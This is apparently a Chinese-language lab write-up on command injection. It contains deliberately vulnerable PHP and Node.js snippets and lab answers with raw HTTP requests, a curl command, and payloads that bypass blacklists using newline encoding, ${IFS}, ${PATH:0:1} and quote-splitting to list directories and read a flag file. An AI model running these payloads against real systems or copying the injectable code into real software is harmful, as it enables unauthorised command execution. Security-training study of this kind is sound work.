---
title: "命令注入"
published: 2026-06-27
updated: 2026-06-27
draft: false
description: "https://github.com/Bashfuscator/Bashfuscator.git"
image: ""
tags:
  - RCE
category: 网络安全
pinned: false
comment: true
author: Ziddzide
---

# 混淆工具

### Linux

```
https://github.com/Bashfuscator/Bashfuscator.git
```

# 具有缺陷的代码案例

```php
<?php
if (isset($_GET['filename'])) {
    system("touch /tmp/" . $_GET['filename'] . ".pdf");
}
?>
```

```js
app.get("/createfile", function(req, res){
    child_process.exec(`touch /tmp/${req.query.filename}.txt`);
})
```

# 尝试在 IP 字段的 ip 后面添加任意注入运算符。错误信息是什么（英文）？

```
Please match the required format
```

# 查看页面的HTML源代码，找到前端输入验证发生的位置。它在哪一行？

```
17
```

#  尝试使用剩余的三个注入运算符（换行符、&、|），看看它们各自的作用以及输出结果有何不同。哪一个运算符只显示注入命令的输出？

只能是`|`,换行符会破坏命令导致无法输出，至于`&`会导致两条命令同时执行，无法显示

```http
POST / HTTP/1.1
Host: 154.57.164.72:31533
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 21
Origin: http://154.57.164.72:31533
Connection: keep-alive
Referer: http://154.57.164.72:31533/
Upgrade-Insecure-Requests: 1
Priority: u=0, i

ip=127.0.0.1 & whoami
```

# 尝试所有其他注入运算符，看看是否有任何运算符未被列入黑名单。Web 应用程序不会将换行符、& 或 | 列入黑名单，请问哪个运算符未被列入黑名单？

绕过命令注入黑名单，使用攻击模块跑字典就行

```
\n
```

这里探测&的时候也可以显示正常命令但是&后的命令变蓝了输入答案也不对，bp里当作连接参数的连接符了错误判断了，需要转化为url编码进行测试

# 运用本节所学知识执行命令“ls -la”。“index.php”文件的大小是多少？

这里说的本节主要讲的是空白字符绕过

```
curl -X POST -H 'Referer: http://154.57.164.82:30833/' -H 'Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5' -H 'Origin: http://154.57.164.82:30833' -H 'Upgrade-Insecure-Requests: 1' -H 'Priority: u=0, i' -H 'Accept-Encoding: gzip, deflate' -H 'Content-Type: application/x-www-form-urlencoded' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -d 'ip=%0als${IFS}-la' 'http://154.57.164.82:30833/'
```

payload

```
ip=%0als${IFS}-la
```

# 查找“/home”文件夹中的用户名

只需要绕过`/`字符即可

```
ip=%0als${IFS}-la${IFS}${PATH:0:1}home
```

# 找到之前找到的用户主文件夹中的 flag.txt 文件的内容。

需要绕过黑名单，使用`'`即可

```
ip=127.0.0.1%0ac'a't${IFS}${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt
```

# 使用本节中学到的技巧之一，查找以下命令的输出：find /usr/share/ | grep root | grep mysql | tail -n 1

替换`空格`，`/`，以及`关键词`和`|`即可

```
ip=%0at'ai'l${IFS}-n${IFS}1<<<$(g're'p${IFS}m'ys'ql<<<$(g're'p${IFS}root<<<$(f'in'd${IFS}${PATH:0:1}u's'r${IFS}${PATH:0:1}sh'ar'e)))
```
